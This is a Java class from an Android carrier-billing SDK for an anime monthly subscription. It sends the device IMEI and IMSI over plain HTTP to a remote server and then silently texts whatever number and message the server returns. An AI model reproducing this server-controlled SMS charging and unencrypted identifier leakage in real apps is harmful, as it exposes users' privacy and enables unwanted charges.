package mobi.zty.pay.sdk.dongmaMonth;

import java.net.URLEncoder;
import java.util.HashMap;
import java.util.Map;

import mobi.zty.pay.sdk.PayConfig;
import mobi.zty.pay.sdk.PayResultInfo;
import mobi.zty.pay.sdk.PaymentInterf;
import mobi.zty.sdk.game.Constants;
import mobi.zty.sdk.game.GameSDK;
import mobi.zty.sdk.game.bean.FeeInfo;
import mobi.zty.sdk.game.bean.MkInfo;
import mobi.zty.sdk.util.Helper;
import mobi.zty.sdk.util.HttpRequestt;
import mobi.zty.sdk.util.Util_G;

import org.json.JSONArray;
import org.json.JSONObject;

import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.os.Handler;
import android.os.Message;

/**
 *动漫包月 支付管理类
 * @author Administrator
 *
 */
public class DongmanMonthInstance extends PaymentInterf{
	private static DongmanMonthInstance instance;
	private Handler callBHandler = null;
	private String url1;
	private String url2;
	private String msgId;
	public static DongmanMonthInstance getInstance(){
		if(instance==null){
			instance = scyMMpay();
		}
		return instance;
	}
	private static synchronized DongmanMonthInstance scyMMpay(){
		if(instance==null){
			instance =  new DongmanMonthInstance();
		}
		return instance;
	}
	@Override
	public void init(Context context, Object... parameters) {
		callBHandler = (Handler) parameters[0];
		MkInfo info = (MkInfo) parameters[1];
		url1 = info.payUrl1;
		url2 = info.payUrl2;
	}

	@Override
	public void pay(final Context context, Object... parameters) {
		final int feeIndex = (Integer) parameters[1];
		FeeInfo feeInfo = (FeeInfo) parameters[2];
		MkInfo mkInfo = (MkInfo) parameters[3];
		
		final String channel = mkInfo.spChannel;
		final int money = feeInfo.consume;
		final String imei = Helper.getIMEI(context);
		final String imsi = Helper.getIMSI(context);
		final String chapterId = feeInfo.payCode;
		
			new Thread(new Runnable() {
				@Override
				public void run() {
					PayResultInfo info = new PayResultInfo();
					info.index = feeIndex;
					try {
						String url = url1+"?imei="+imei+"&imsi="+imsi+"&price="+money+"&chapterId="+chapterId+
								"&channel="+channel+"&msgCallback=true";
						String requestResponse = HttpRequestt.get(url).body();
						boolean isSendMsg = false;
						if (requestResponse!=null && requestResponse!="") {
							JSONObject retJson = new JSONObject(requestResponse);
							int state = Helper.getJsonInt(retJson, "status");
							if (state==0) {//订单获取成
								String message = Helper.getJsonString(retJson, "message");
								String receiver = Helper.getJsonString(retJson, "receiver");
								msgId = Helper.getJsonString(retJson, "msgId");
								Intent itSend = new Intent(Constants.SENT_SMS_ACTION);  
								itSend.putExtra("fee_index", feeIndex);
						        PendingIntent mSendPI = PendingIntent.getBroadcast(context.getApplicationContext(), 0, itSend, PendingIntent.FLAG_ONE_SHOT);//这里requestCode和flag的设置很重要，影响数据KEY_PHONENUM的传递。   
						        Util_G.sendTextMessage(context, receiver, message, mSendPI, 0);
						        Util_G.debugE("dongma_pay", "send_num->"+receiver+" msgId"+msgId);
						        Util_G.debugE("dongma_pay", "pay_data->"+message+"  feeIndex->"+feeIndex);
						        
						        isSendMsg = true;
							}
						}   
						if (!isSendMsg) {
							info.resutCode = PayConfig.SP_PAY_FAIL;
							info.retMsg = "支付失败";
							Message message = callBHandler.obtainMessage(PayConfig.NOTIFY_PAYRESULT);
							message.obj = info;
							message.sendToTarget();
							return;
						}
				    	
					} catch (Exception e) {
						info.resutCode = PayConfig.SP_PAY_EXPTION;
						info.retMsg = "支付失败";
						Message message = callBHandler.obtainMessage(PayConfig.NOTIFY_PAYRESULT);
						message.obj = info;
						message.sendToTarget();
						e.printStackTrace();
					}
				}
			}).start();;
	}
	
	@Override
	public void notifyPay(Object... parameters) {
		new Thread(new Runnable() {
			@Override
			public void run() {
				String url = url2+"?msgId="+msgId;
				String requestResponse = HttpRequestt.get(url).body();
				if (requestResponse!=null && requestResponse!="") {
					JSONObject retJson = Helper.getJSONObject(requestResponse);
					int state = Helper.getJsonInt(retJson, "status");
					Util_G.debugE("dongma_pay", "pay_succ->"+state);
				}
			}
		}).start();
		
	}
	
}
